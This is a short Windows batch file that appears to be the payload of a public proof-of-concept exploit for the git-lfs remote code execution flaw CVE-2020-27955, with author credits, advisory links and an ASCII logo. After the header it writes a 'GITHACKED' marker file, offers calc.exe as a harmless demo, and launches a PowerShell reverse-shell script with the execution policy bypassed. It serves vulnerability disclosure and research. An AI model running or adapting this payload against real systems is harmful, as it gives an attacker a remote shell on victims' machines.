::
:: git-lfs Remote Code Execution (RCE) exploit CVE-2020-27955
:: by Dawid Golunski
:: 
:: https://legalhackers.com
:: https://exploitbox.io
::
::
::
:: Check out the full advisory for details:
:: https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html
::
:: PoC video at:
:: https://youtu.be/tlptOf9w274
::
::
::
::                        .;lc'
::                    .,cdkkOOOko;.
::                 .,lxxkkkkOOOO000Ol'
::             .':oxxxxxkkkkOOOO0000KK0x:'
::          .;ldxxxxxxxxkxl,.'lk0000KKKXXXKd;.
::       ':oxxxxxxxxxxo;.       .:oOKKKXXXNNNNOl.
::      '';ldxxxxxdc,.              ,oOXXXNNNXd;,.
::     .ddc;,,:c;.         ,c:         .cxxc:;:ox:
::     .dxxxxo,     .,   ,kMMM0:.  .,     .lxxxxx:
::     .dxxxxxc     lW. oMMMMMMMK  d0     .xxxxxx:
::     .dxxxxxc     .0k.,KWMMMWNo :X:     .xxxxxx:
::     .dxxxxxc      .xN0xxxxxxxkXK,      .xxxxxx:
::     .dxxxxxc    lddOMMMMWd0MMMMKddd.   .xxxxxx:
::     .dxxxxxc      .cNMMMN.oMMMMx'      .xxxxxx:
::     .dxxxxxc     lKo;dNMN.oMM0;:Ok.    'xxxxxx:
::     .dxxxxxc    ;Mc   .lx.:o,    Kl    'xxxxxx:
::     .dxxxxxdl;. .,               .. .;cdxxxxxx:
::     .dxxxxxxxxxdc,.              'cdkkxxxxxxxx:
::      .':oxxxxxxxxxdl;.       .;lxkkkkkxxxxdc,.
::          .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.
::             .':oxxxxxxxxx.ckkkkkkkkxl,.
::                 .,cdxxxxx.ckkkkkxc.
::                    .':odx.ckxl,.
::                        .,.'.
::
:: https://ExploitBox.io
:: https://twitter.com/Exploit_Box
::


:: Create a test file
::
echo hacked
echo hacked > GITHACKED

:: uncomment below if you just want to pop an innocent calc :)
::
:: calc.exe

:: Reverse Shell - Change TCPClient() host/port (e.g: localhost,1337)
:: 
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass .\revsh_powersh.ps1

